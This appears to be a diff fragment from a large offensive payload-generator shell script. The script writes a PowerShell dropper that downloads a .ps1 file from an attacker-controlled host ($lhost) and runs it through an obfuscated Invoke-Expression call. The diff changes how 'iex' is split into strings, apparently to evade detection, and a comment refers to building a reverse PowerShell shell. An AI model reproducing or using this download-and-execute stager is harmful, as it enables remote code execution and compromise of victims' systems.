@@ -12052,7 +12052,7 @@ echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPA
 echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
 echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
 ## Obfuscated IEX (Invoke-Expression) API call (in PS console)
-echo "\$ ('i'+'ex') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
+echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 
 
 ## Build Reverse Powershell Shell
